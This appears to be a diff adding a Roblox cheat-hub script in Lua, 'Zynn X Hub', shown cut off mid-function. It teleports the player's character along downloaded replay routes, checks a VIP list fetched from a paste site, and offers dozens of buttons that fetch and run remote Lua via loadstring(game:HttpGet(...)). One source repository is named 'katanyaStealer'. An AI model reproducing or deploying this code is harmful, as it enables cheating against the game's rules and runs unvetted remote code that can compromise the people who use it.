@@ -1,0 +1,1223 @@
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+local Window = WindUI:CreateWindow({
+Title = "Zynn X Hub",
+Icon = "mountain-snow",
+Author = "by Zyn",
+Folder = "ZynXhub",
+NewElements = true,
+
+Size = UDim2.fromOffset(545, 430),
+Transparent = true,
+Theme = "Midnight",
+Resizable = true,
+SideBarWidth = 200,
+BackgroundImageTransparency = 0.42,
+HideSearchBar = false,
+ScrollBarEnabled = false,
+
+User = {
+Enabled = true,
+Anonymous = false,
+Callback = function()
+print("User button clicked!")
+end,
+},
+})
+
+Window:EditOpenButton({
+    Title = "ZYN X HUB",
+    Icon = "hand-metal",
+    CornerRadius = UDim.new(0,16),
+    StrokeThickness = 2,
+    Color = ColorSequence.new( -- gradient
+        Color3.fromHex("FF0F7B"), 
+        Color3.fromHex("F89B29")
+    ),
+    OnlyMobile = false,
+    Enabled = true,
+    Draggable = true,
+})
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+
+---------------------------------------------------------------------
+-- 👑 VIP SYSTEM
+---------------------------------------------------------------------
+
+local vipURL = "https://pastefy.app/TAjP5fXd/raw"
+local VIPList, isVIP = {}, false
+
+pcall(function()
+local response = game:HttpGet(vipURL)
+for line in response:gmatch("[^\r\n]+") do
+line = line:gsub("%s+", "")
+if line ~= "" then table.insert(VIPList, line) end
+end
+end)
+
+for _, name in ipairs(VIPList) do
+if string.lower(name) == string.lower(player.Name) then
+isVIP = true
+break
+end
+end
+
+print(isVIP and "✅ Kamu VIP!" or "❌ Kamu bukan VIP!")
+
+local function NotifyNonVIP()
+WindUI:Notify({
+Title = "ZYN X HUB",
+Description = "❌ Fitur ini hanya untuk VIP!",
+Duration = 3
+})
+end
+
+
+---------------------------------------------------------------------
+-- 🔁 VARIABEL GLOBAL
+---------------------------------------------------------------------
+
+local selectedMap = nil
+local savedReplays = {}
+local teleportSpeed = 5
+local modeTurun = false
+local stopAll = false
+local replayLock = false
+local currentReplayToken = nil
+local autoLoopFlag = false
+local humanoid, rootPart, autoForward
+_G.MODE_BACK = false  -- ✅ MODE BACK baru
+
+
+---------------------------------------------------------------------
+-- 👤 CHARACTER SETUP
+---------------------------------------------------------------------
+
+local function updateCharacter(char)
+if not char then return end
+local hrp, hum
+repeat
+task.wait()
+hrp = char:FindFirstChild("HumanoidRootPart")
+hum = char:FindFirstChildOfClass("Humanoid")
+until hrp and hum
+
+rootPart, humanoid = hrp, hum
+end
+
+if player.Character then updateCharacter(player.Character) end
+player.CharacterAdded:Connect(updateCharacter)
+
+
+---------------------------------------------------------------------
+-- 🧩 UTILITY
+---------------------------------------------------------------------
+
+local function safeVec(v)
+if typeof(v) == "Vector3" then return v end
+if typeof(v) == "table" and #v >= 3 then
+return Vector3.new(tonumber(v[1]) or 0, tonumber(v[2]) or 0, tonumber(v[3]) or 0)
+end
+return Vector3.zero
+end
+
+
+---------------------------------------------------------------------
+-- ▶️ REPLAY SYSTEM
+---------------------------------------------------------------------
+
+local function playFrames(frames, onFinish)
+if replayLock or #frames == 0 then return end
+replayLock = true
+if currentReplayToken then currentReplayToken.stop = true end
+
+local token = { stop = false }
+currentReplayToken = token
+autoForward = true
+
+local index = 1
+local lastY = nil
+local isJumping = false
+local lastJumpTime = 0
+local jumpCooldown = 0.5
+
+while index < #frames and not token.stop and not stopAll do
+if not rootPart or not humanoid or humanoid.Health <= 0 then
+task.wait()
+else
+local i = math.floor(index)
+local f, fNext = frames[i], frames[i + 1]
+if f and fNext and f.Position and fNext.Position then
+local pos1 = safeVec(f.Position)
+local pos2 = safeVec(fNext.Position)
+local look1 = safeVec(f.LookVector)
+local look2 = safeVec(fNext.LookVector)
+local up1 = safeVec(f.UpVector)
+local up2 = safeVec(fNext.UpVector)
+local alpha = index - i
+
+local pos = pos1:Lerp(pos2, alpha)
+local look = look1:Lerp(look2, alpha).Unit
+local up = up1:Lerp(up2, alpha).Unit
+
+-- MODE TURUN (Mini/Zepeto)
+if modeTurun then
+local currentOffset = (humanoid and humanoid.HipHeight or 2) + (rootPart and rootPart.Size.Y / 2 or 0)
+local recordedOffset = (f.HipHeight or 2) + (f.RootSizeY or 0)
+local offsetDiff = currentOffset - recordedOffset
+pos = pos + Vector3.new(0, offsetDiff * 0.8 - 1, 0)
+end
+
+-- JUMP DETECTION
+if lastY then
+local deltaY = pos.Y - lastY
+local now = tick()
+if deltaY > 0.5 and not isJumping and (now - lastJumpTime) > jumpCooldown then
+isJumping = true
+lastJumpTime = now
+pcall(function()
+humanoid.Jump = true
+humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+end)
+end
+if deltaY < -0.1 and isJumping then
+isJumping = false
+end
+end
+
+lastY = pos.Y
+
+-- ✅ MODE BACK DITERAPKAN DI SINI
+pcall(function()
+local finalLook = look
+if _G.MODE_BACK then
+finalLook = -look   -- 🔥 membalik 180°
+end
+
+rootPart.CFrame = CFrame.lookAt(pos, pos + finalLook, up)
+end)
+end
+end
+index += teleportSpeed * 0.1
+RunService.Heartbeat:Wait()
+end
+
+autoForward, replayLock, currentReplayToken = false, false, nil
+if not stopAll and onFinish then onFinish() end
+end
+
+
+---------------------------------------------------------------------
+-- MOVEMENT SMOOTHING
+---------------------------------------------------------------------
+
+local lastReplayPos = nil
+
+RunService.RenderStepped:Connect(function(deltaTime)
+if not autoForward or not humanoid or not rootPart or humanoid.Health <= 0 then
+return
+end
+
+local targetPos = rootPart.Position
+if lastReplayPos == nil then
+lastReplayPos = targetPos
+return
+end
+
+local delta = targetPos - lastReplayPos
+local moveThreshold = 0.01
+
+if delta.Magnitude > moveThreshold then
+local fullMoveDir = delta.Unit
+pcall(function()
+humanoid:Move(fullMoveDir, false)
+end)
+else
+pcall(function()
+humanoid:Move(Vector3.new(0, 0, 0), false)
+end)
+end
+
+lastReplayPos = targetPos
+end)
+
+
+---------------------------------------------------------------------
+-- 🗺️ DYNAMIC MAP UI (VIP)
+---------------------------------------------------------------------
+
+local function CreateDynamicMapUI(tab, mapName)
+if not isVIP then return end
+
+local function CreateVIPButton(options)
+options.Locked = false
+tab:Button(options)
+end
+
+---------------------------------------------------------------------
+-- SPEED (warna biru)
+---------------------------------------------------------------------
+tab:Dropdown({
+Title = "SPEED",
+Values = (function() local t={} for i=1,100 do t[#t+1]=tostring(i) end return t end)(),
+Default = tostring(teleportSpeed),
+Callback = function(v)
+teleportSpeed = tonumber(v) or 5
+WindUI:Notify({ Title="Speed Changed", Content="Speed: "..teleportSpeed, Icon="zap", Duration=2 })
+end
+})
+
+---------------------------------------------------------------------
+-- MODE ZEPETO/MINI (warna hijau)
+---------------------------------------------------------------------
+tab:Toggle({
+Title = "MODE ZEPETO/MINI",
+Default = modeTurun,
+Callback = function(s)
+modeTurun = s
+WindUI:Notify({ Title="Mode Zepeto/Mini", Content=s and "Aktif" or "Dimatikan", Duration=2 })
+end
+})
+
+---------------------------------------------------------------------
+-- MODE JALAN MUNDUR (warna kuning)
+---------------------------------------------------------------------
+tab:Toggle({
+Title = "MODE JALAN MUNDUR",
+Default = false,
+Callback = function(v)
+_G.MODE_BACK = v
+WindUI:Notify({
+Title = "MODE BACK",
+Content = v and "Aktif (menghadap belakang)" or "Dimatikan",
+Duration = 2
+})
+end
+})
+
+---------------------------------------------------------------------
+-- START (warna ungu)
+---------------------------------------------------------------------
+CreateVIPButton({
+    Title = "START",
+    Icon = "circle-play",
+    Color = Color3.fromRGB(80, 255, 120),
+    Callback = function()
+
+        if #savedReplays == 0 or not rootPart then return end
+
+        -- 🔥 Gabungkan semua frame menjadi satu rute penuh
+        local fullFrames = {}
+        for _, replay in ipairs(savedReplays) do
+            if replay.Frames then
+                for _, f in ipairs(replay.Frames) do
+                    table.insert(fullFrames, f)
+                end
+            end
+        end
+
+        if #fullFrames == 0 then return end
+
+        -- 🔥 Cari frame terdekat dari seluruh rute (bukan checkpoint)
+        local closestIndex, closestDist = 1, math.huge
+        for i, f in ipairs(fullFrames) do
+            if f.Position then
+                local dist = (safeVec(f.Position) - rootPart.Position).Magnitude
+                if dist < closestDist then
+                    closestDist = dist
+                    closestIndex = i
+                end
+            end
+        end
+
+        -- 🔥 Slice dari frame terdekat → sampai FINISH
+        local sliced = {}
+        for i = closestIndex, #fullFrames do
+            table.insert(sliced, fullFrames[i])
+        end
+
+        stopAll = false
+        playFrames(sliced)
+    end
+})
+---------------------------------------------------------------------
+-- STOP (warna merah)
+---------------------------------------------------------------------
+CreateVIPButton({
+Title = "STOP",
+Icon = "circle-stop",
+Color = Color3.fromRGB(255, 80, 80), -- merah
+Callback = function()
+stopAll = true
+autoLoopFlag = false
+if currentReplayToken then currentReplayToken.stop = true end
+autoForward = false
+end
+})
+
+---------------------------------------------------------------------
+-- LOOP (warna cyan)
+---------------------------------------------------------------------
+CreateVIPButton({
+Title = "STAR (LOOP)",
+Icon = "rotate-ccw",
+Color = Color3.fromRGB(255, 230, 60), -- kuning
+Callback = function()
+if autoLoopFlag then return end
+autoLoopFlag = true
+stopAll = false
+
+task.spawn(function()
+while autoLoopFlag and not stopAll do
+for _, replay in ipairs(savedReplays) do
+if stopAll then break end
+if replay.Frames and #replay.Frames > 0 then
+playFrames(replay.Frames)
+task.wait(0.5)
+end
+end
+
+if stopAll then break end
+
+pcall(function()
+player.Character:BreakJoints()
+end)
+
+player.CharacterAdded:Wait()
+task.wait(1)
+end
+end)
+end
+})
+end
+
+---------------------------------------------------------------------
+-- MENU/TAB UTAMA
+---------------------------------------------------------------------
+
+local mapsTab = Window:Tab({ Title = "AUTO WALK", Icon = "gamepad-2" })
+local dynamicPanel = nil
+
+
+---------------------------------------------------------------------
+-- DATA MAPS LIST
+---------------------------------------------------------------------
+
+local Maps = {
+["MT MONO"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Mono/main/Replays.json",
+["MT ARUNIKA"] = "https://raw.githubusercontent.com/Trzzhub1/Aru/main/Replays.json",
+["MT ATIN"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Atin6/main/Replays.json",
+["MT DAUN"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Daunnn/main/Replays.json",
+["KOTA BUKAN GUNUNG"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Kota0/main/Replays.json",
+["MT ANEH PRO"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/ANEHH/main/Replays.json",
+["MT PEDAUNAN"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Pedaunan1/main/Replays.json",
+["MT YNTKTS"] = "https://raw.githubusercontent.com/Trzzhub1/Kts/main/Replays.json",
+["MT PENGANGGURAN"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Pengangguran/main/Replays.json",
+["MT YAHAYUK"] = "https://raw.githubusercontent.com/Trzzhub1/Yyyy/main/Replays.json",
+["MT LEMBAYANA"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Lembayana/main/Replays.json",
+["MT IMUT"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Imut/main/Replays.json",
+["MT MALAIKAT"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Malaikat/main/Replays.json",
+["MT FUNNY"] = "https://raw.githubusercontent.com/Trzzhub1/Nyy/main/Replays.json",
+["MT KALISTA"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Kalista/main/Replays.json",
+["MT DUCKY"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/DUCKY/main/Replays.json",
+["MT PRAMBANAN"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Prmbnn/main/Replays.json",
+["ANTARTIKA HARD"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Antartika/main/Replays.json",
+["MT RUNIA"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Runnnia/main/Replays.json",
+["MT AGE"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Age/main/Replays.json",
+["EKSPEDISI KOTA"] = "https://raw.githubusercontent.com/captenjr1230-oss/Ekspedisi-kota/main/Replays.json",
+["KAWAH TERJUN HARD"] = "https://raw.githubusercontent.com/captenjr1230-oss/KAWAH/main/Replays.json",
+["MT QIAN"] = "https://raw.githubusercontent.com/captenjr1230-oss/QIAN/main/Replays.json",
+["MT TORAJA"] = "https://raw.githubusercontent.com/captenjr1230-oss/Toraja-/main/Replays.json",
+["MT GEMI"] = "https://raw.githubusercontent.com/Trzzhub1/Me/main/Replays.json",
+["MT WASABI"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Wasabi/main/Replays.json",
+["MT FREESTYLE"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Freestyle/main/Replays.json",
+["MT RAGON"] = "https://raw.githubusercontent.com/Trzzhub1/Gn/main/Replays.json",
+["MT BAGEN DAH"] = "https://raw.githubusercontent.com/Trzzhub1/BAGEN-DAH-/main/Replays.json",
+["MT DAY ONE"] = "https://raw.githubusercontent.com/tarz2642008-ship-it/Day-one/main/Replays.json",
+["MT ENTAH APA"] = "https://raw.githubusercontent.com/Trzzhub1/ENTAH-APA-/main/Replays.json",
+["MT YAGESYA"] = "https://raw.githubusercontent.com/Trzzhub1/YAGESYA/main/Replays.json",
+["MT SERASA"] = "https://raw.githubusercontent.com/Trzzhub1/SERASA/main/Replays.json",
+["MT NETIZEN"] = "https://raw.githubusercontent.com/Trzzhub1/Ti/main/Replays.json",
+["MT LONELY"] = "https://raw.githubusercontent.com/Trzzhub1/Lo/main/Replays.json",
+["MT FEELS"] = "https://raw.githubusercontent.com/Trzzhub1/FEELS/main/Replays.json",
+["MT KRETEK"] = "https://raw.githubusercontent.com/Trzzhub1/KRETEK/main/Replays.json",
+["MT ZORA"] = "https://raw.githubusercontent.com/Trzzhub1/ZORA/main/Replays.json",
+["MT TALI"] = "https://raw.githubusercontent.com/Trzzhub1/TALI/main/Replays.json",
+["MT FOREVER"] = "https://raw.githubusercontent.com/Trzzhub1/FOREVER/main/Replays.json",
+["MT VELORA"] = "https://raw.githubusercontent.com/Trzzhub1/Agek/main/Replays.json",
+["MT YAHAYUK PRO"] = "https://raw.githubusercontent.com/Trzzhub1/Ttt/main/Replays.json",
+["MT KITA"] = "https://raw.githubusercontent.com/Trzzhub1/Ta/main/Replays.json",
+["MT ANJIR"] = "https://raw.githubusercontent.com/Trzzhub1/Jr/main/Replays.json",
+["MT DAUN PRO"] = "https://raw.githubusercontent.com/Trzzhub1/Dn/main/Replays.json",
+["MT RAPUK"] = "https://raw.githubusercontent.com/Trzzhub1/Kppp/main/Replays.json",
+["MT NEWBIE"] = "https://raw.githubusercontent.com/Trzzhub1/Yee/main/Replays.json",
+["MT YAHHASU"] = "https://raw.githubusercontent.com/Trzzhub1/Yh/main/Replays.json",
+["MT CINTA"] = "https://raw.githubusercontent.com/itwasabraham/All-Mount/refs/heads/main/datamarv/otherdatamap/mount_cinta.json"
+}
+
+
+---------------------------------------------------------------------
+-- DROPDOWN MAP + PANEL VIP
+---------------------------------------------------------------------
+
+if isVIP then
+
+mapsTab:Dropdown({
+Title = "Pilih Map",
+Values = (function() local t={} for m,_ in pairs(Maps) do t[#t+1]=m end return t end)(),
+Default = "Pilih Map",
+Callback = function(selected)
+local url = Maps[selected]
+local ok, data = pcall(function()
+return HttpService:JSONDecode(game:HttpGet(url))
+end)
+
+if ok and type(data) == "table" then
+savedReplays = data
+selectedMap = selected
+
+WindUI:Notify({
+Title = "MAP Loaded",
+Content = "Map "..selected.." berhasil dimuat!",
+Icon = "map-pin",
+Duration = 3
+})
+
+if dynamicPanel then dynamicPanel:Destroy() dynamicPanel = nil end
+
+dynamicPanel = mapsTab:Section({
+Title = "Fitur Map: "..selected,
+Text = "Kontrol replay dan fitur VIP",
+TextXAlignment = "Left",
+TextSize = 16,
+})
+
+CreateDynamicMapUI(dynamicPanel, selected)
+
+else
+WindUI:Notify({
+Title = "Load Failed",
+Content = "Gagal memuat map: "..selected,
+Duration = 3
+})
+end
+end
+})
+
+else
+mapsTab:Section({
+Title = "🚫 AKSES DI TOLAK SILAHKAN BUY VIP",
+Text = "Fitur ini khusus VIP.",
+TextXAlignment = "Left",
+TextSize = 18,
+})
+WindUI:Notify({
+Title = "ZYN X HUB",
+Description = "❌ Kamu bukan VIP.",
+Duration = 3
+})
+end
+
+
+---------------------------------------------------
+-- ⚔️ UNIVERSAL TAB (pakai sistem VIP / isVIP)
+---------------------------------------------------
+
+local SuTab = Window:Tab({
+    Title = "UNIVERSAL",
+    Icon = "gamepad",
+    Locked = false,
+})
+
+-- Pastikan isVIP sudah ada
+if isVIP == nil then
+    isVIP = false
+end
+
+---------------------------------------------------
+-- ❌ Jika BUKAN VIP → blok seluruh Universal
+---------------------------------------------------
+if not isVIP then
+    SuTab:Section({
+        Title = "🚫 AKSES DI TOLAK SILAHKAN JOIN VIP",
+        Text = "Fitur UNIVERSAL hanya untuk pengguna VIP.",
+        TextSize = 18,
+    })
+    return
+end
+
+
+---------------------------------------------------
+-- ✅ FISH IT TAB
+---------------------------------------------------
+
+local UnTab = SuTab:Section({
+    Title = "FISH IT",
+    Icon = "fish",
+    Opened = false,
+})
+
+UnTab:Button({
+Title = "VINZ HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vinzyy13/VinzHub/refs/heads/main/Fish-It"))()
+end
+})
+
+UnTab:Button({
+Title = "STEE HUB",
+Callback = function()
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/ecd9069dab3d2aa3"))()
+end
+})
+
+UnTab:Button({
+Title = "VORA HUB",
+Callback = function()
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/b5652e722eb30b13"))()
+end
+})
+
+UnTab:Button({
+Title = "CHLOE HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MajestySkie/Chloe-X/main/Main/ChloeX"))()
+end
+})
+
+UnTab:Button({
+Title = "SYX HUB",
+Callback = function()
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/f9ecec6fa3ba4e7717a62cc0c25915644ad4ad7a01b09afb77a42226210884d7/download"))()
+end
+})
+
+UnTab:Button({
+Title = "LIME HUB",
+Callback = function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6148a228aa218018a2d6ed358f16add3.lua"))()
+end
+})
+
+UnTab:Button({
+Title = "ALDYTOI HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/katanyaStealer/refs/heads/main/amazingCast.lua"))()
+end
+})
+
+UnTab:Button({
+Title = "SERAPHIN HUB",
+Callback = function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/65cde64670656efe745182fc3db01be6.lua"))()
+end
+})
+
+UnTab:Button({
+Title = "LONELY HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KoonpeatchRE/Lonely_Hub/refs/heads/main/Fish_It"))()
+end
+})
+
+UnTab:Button({
+Title = "CHIYO HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaisenlmao/loader/refs/heads/main/chiyo.lua"))()
+end
+})
+
+
+---------------------------------------------------
+-- ✅ STEAL A BRAINROT TAB
+---------------------------------------------------
+
+local BlTab = SuTab:Section({
+    Title = "STEAL A BRAINROT",
+    Icon = "ghost",
+    Opened = false,
+})
+
+BlTab:Button({
+Title = "RIFT HUB",
+Callback = function()
+loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+end
+})
+
+BlTab:Button({
+Title = "LUMIN HUB",
+Callback = function()
+loadstring(game:HttpGet("http://luminon.top/loader.lua"))()
+end
+})
+
+
+---------------------------------------------------
+-- ✅ RAISE ANIMALS TAB
+---------------------------------------------------
+
+local AnTab = SuTab:Section({
+    Title = "RAISE ANIMALS",
+    Icon = "rabbit",
+    Opened = false,
+})
+
+AnTab:Button({
+Title = "TBAO HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubRaiseAnimals"))()
+end
+})
+
+AnTab:Button({
+Title = "JINKX HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stormskmonkey/JinkX/main/Loader.lua"))()
+end
+})
+
+AnTab:Button({
+Title = "AIRFLOW HUB",
+Callback = function()
+loadstring(game:HttpGet("https://airflowscript.com/loader"))()
+end
+})
+
+AnTab:Button({
+Title = "BONK HUB",
+Callback = function()
+getgenv().Key = "BONKHUB-lHKmii-IIEqW3"
+getgenv().DiscordId = "823163528407547924"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Toonza555/Project/refs/heads/main/PremiumLoader.lua", true))()
+end
+})
+
+
+---------------------------------------------------
+-- ✅ 99 NIGHTS IN THE FOREST TAB
+---------------------------------------------------
+
+local SsTab = SuTab:Section({
+    Title = "99 NIGHTS IN THE FOREST",
+    Icon = "apple",
+    Opened = false,
+})
+
+SsTab:Button({
+Title = "NAT HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dy1zn4t/NatHub/refs/heads/main/loader"))();
+end
+})
+
+SsTab:Button({
+Title = "VECTOR HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/Vector_Hub/0/v2"))()
+end
+})
+
+SsTab:Button({
+Title = "TOASTY HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/ToastyHub-XD/refs/heads/main/hub-main.lua"))()
+end
+})
+
+SsTab:Button({
+Title = "RIFT HUB",
+Callback = function()
+loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+end
+})
+
+SsTab:Button({
+Title = "VOIDWARE HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
+end
+})
+
+
+---------------------------------------------------
+-- ✅  BLOX FRUIT TAB
+---------------------------------------------------
+
+local BbTab = SuTab:Section({
+    Title = "BLOX FRUITS",
+    Icon = "citrus",
+    Opened = false,
+})
+
+BbTab:Button({
+Title = "PINE HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jadelly261/BloxFruits/refs/heads/main/PineLoader", true))()
+end
+})
+
+BbTab:Button({
+Title = "TDT HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThinhNek343/tdthub/refs/heads/main/maintdt.lua"))()
+end
+})
+
+---------------------------------------------------
+-- ✅  BLOX FRUIT TAB
+---------------------------------------------------
+
+local GgTab = SuTab:Section({
+    Title = "GROW A GARDEN",
+    Icon = "hammer",
+    Opened = false,
+})
+
+GgTab:Button({
+Title = "SPEED HUB",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end
+})
+
+GgTab:Button({
+Title = "THUNDER Z HUB",
+Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
+end
+})
+
+
+---------------------------------------------------
+-- ⚙️ Fungsi Umum untuk Ganti Animasi
+---------------------------------------------------
+local LastSelectedAnimations = {}
+
+local function StopAllPlayingAnimations(humanoid)
+for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+track:Stop()
+end
+end
+
+local function ApplyAnimation(animType, animId, animName)
+if not isVIP then
+return NotifyNonVIP()
+end
+
+local plr = game.Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local humanoid = char:WaitForChild("Humanoid")
+local animate = char:FindFirstChild("Animate")
+
+if not animate then
+warn("Animate script tidak ditemukan!")
+return
+end
+
+local folder = animate:FindFirstChild(animType:lower())
+if not folder or #folder:GetChildren() == 0 then
+warn(animType .. " folder tidak ditemukan di Animate!")
+return
+end
+
+StopAllPlayingAnimations(humanoid)
+
+for _, anim in ipairs(folder:GetChildren()) do
+if anim:IsA("Animation") then
+anim.AnimationId = "rbxassetid://" .. animId
+end
+end
+
+LastSelectedAnimations[animType] = { Id = animId, Name = animName }
+humanoid:ChangeState(Enum.HumanoidStateType.Running)
+print("[✅] " .. animType .. " animation diganti ke: " .. animName)
+end
+
+
+---------------------------------------------------
+-- 🔁 Auto Apply Animasi Saat Respawn
+---------------------------------------------------
+player.CharacterAdded:Connect(function(char)
+task.wait(1)
+local humanoid = char:WaitForChild("Humanoid")
+local animate = char:WaitForChild("Animate")
+
+StopAllPlayingAnimations(humanoid)
+
+for animType, data in pairs(LastSelectedAnimations) do
+local folder = animate:FindFirstChild(animType:lower())
+if folder then
+if animType:lower() == "idle" and typeof(data.Id) == "table" then
+local i = 1
+for _, anim in ipairs(folder:GetChildren()) do
+if anim:IsA("Animation") and data.Id[i] then
+anim.AnimationId = "rbxassetid://" .. data.Id[i]
+i += 1
+end
+end
+else
+for _, anim in ipairs(folder:GetChildren()) do
+if anim:IsA("Animation") then
+anim.AnimationId = "rbxassetid://" .. data.Id
+end
+end
+end
+end
+end
+
+humanoid:ChangeState(Enum.HumanoidStateType.Running)
+print("[♻️] Animasi diterapkan ulang setelah respawn tanpa bug!")
+end)
+
+
+---------------------------------------------------
+-- 🌀 ANIMATIONS TAB
+---------------------------------------------------
+local AnimTab = Window:Tab({
+Title = "ANIMATIONS",
+Icon = "webhook",
+Locked = false,
+})
+
+if not isVIP then
+AnimTab:Section({
+Title = "🚫 AKSES DI TOLAK SILAHKAN JOIN VIP",
+Text = "Fitur animasi hanya tersedia untuk pengguna VIP.",
+TextSize = 18,
+})
+else
+
+---------------------------------------------------
+-- 🏃 RUN SECTION
+---------------------------------------------------
+local RunSection = AnimTab:Section({
+Title = "🏃 Run Animations",
+TextXAlignment = "Left",
+TextSize = 17,
+})
+
+local RunAnimations = {
+["Adidas Community"] = "82598234841035",
+["Sports (Adidas)"] = "18537384940",
+["Wicked (Popular)"] = "72301599441680",
+["Zombie"] = "616163682"
+}
+
+for name, id in pairs(RunAnimations) do
+RunSection:Button({
+Title = name,
+Desc = name,
+Callback = function()
+ApplyAnimation("Run", id, name)
+end
+})
+end
+
+
+---------------------------------------------------
+-- 🚶 WALK SECTION
+---------------------------------------------------
+local WalkSection = AnimTab:Section({
+Title = "🚶 Walk Animations",
+TextXAlignment = "Left",
+TextSize = 17,
+})
+
+local WalkAnimations = {
+["Adidas Community"] = "122150855457006",
+["Sports (Adidas)"] = "18537392113",
+["Wicked (Popular)"] = "92072849924640",
+}
+
+for name, id in pairs(WalkAnimations) do
+WalkSection:Button({
+Title = name,
+Desc = name,
+Callback = function()
+ApplyAnimation("Walk", id, name)
+end
+})
+end
+
+
+---------------------------------------------------
+-- 🦘 JUMP SECTION
+---------------------------------------------------
+local JumpSection = AnimTab:Section({
+Title = "🦘 Jump Animations",
+TextXAlignment = "Left",
+TextSize = 17,
+})
+
+local JumpAnimations = {
+["Adidas Community"] = "75290611992385",
+["Sports (Adidas)"] = "18537380791",
+["Wicked (Popular)"] = "104325245285198",
+}
+
+for name, id in pairs(JumpAnimations) do
+JumpSection:Button({
+Title = name,
+Desc = name,
+Callback = function()
+ApplyAnimation("Jump", id, name)
+end
+})
+end
+
+
+---------------------------------------------------
+-- 🧘 IDLE SECTION
+---------------------------------------------------
+local IdleSection = AnimTab:Section({
+Title = "🧘 Idle Animations",
+TextXAlignment = "Left",
+TextSize = 17,
+})
+
+local IdleAnimations = {
+["Adidas Community"] = {"122257458498464", "102357151005774"},
+["Vampire"] = {"1083445855", "1083450166"},
+["Wicked (Popular)"] = {"118832222982049", "76049494037641"},
+["NFL"] = {"92080889861410", "74451233229259"},
+}
+
+for name, ids in pairs(IdleAnimations) do
+IdleSection:Button({
+Title = name,
+Desc = name,
+Callback = function()
+local plr = game.Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local humanoid = char:WaitForChild("Humanoid")
+local animate = char:FindFirstChild("Animate")
+
+if animate and animate:FindFirstChild("idle") then
+local folder = animate.idle
+StopAllPlayingAnimations(humanoid)
+local i = 1
+for _, anim in ipairs(folder:GetChildren()) do
+if anim:IsA("Animation") and ids[i] then
+anim.AnimationId = "rbxassetid://" .. ids[i]
+i += 1
+end
+end
+LastSelectedAnimations["Idle"] = { Id = ids, Name = name }
+humanoid:ChangeState(Enum.HumanoidStateType.Running)
+print("[✅] Idle animation diganti ke: " .. name)
+else
+warn("Folder idle tidak ditemukan!")
+end
+end
+})
+end
+end
+
+
+---------------------------------------------------
+-- ⚔️ SCRIPT TAB
+---------------------------------------------------
+local ScriptTab = Window:Tab({
+Title = "SCRIPT",
+Icon = "swords",
+Locked = false,
+})
+
+-- Pastikan variabel isVIP terdefinisi
+if isVIP == nil then
+isVIP = false
+end
+
+---------------------------------------------------
+-- Jika BUKAN VIP
+---------------------------------------------------
+if not isVIP then
+ScriptTab:Section({
+Title = "🚫 AKSES DI TOLAK SILAHKAN JOIN VIP",
+Text = "Silakan join VIP untuk mengakses fitur script.",
+TextSize = 18,
+})
+return
+end
+
+---------------------------------------------------
+-- Jika VIP, tampilkan tombol script
+---------------------------------------------------
+
+ScriptTab:Button({
+Title = "FLY GUI V3",
+Desc = "Terbang bebas di game",
+Callback = function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gui-Fly-v3-37111"))()
+end
+})
+
+ScriptTab:Button({
+Title = "HIDE PLAYERS",
+Desc = "Hide players",
+Callback = function()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- Fungsi untuk menyembunyikan karakter player
+local function fullyHidePlayer(player)
+if player == localPlayer then return end
+
+local function hideChar(char)
+if not char then return end
+-- Lepas dari workspace supaya tidak kelihatan sama sekali
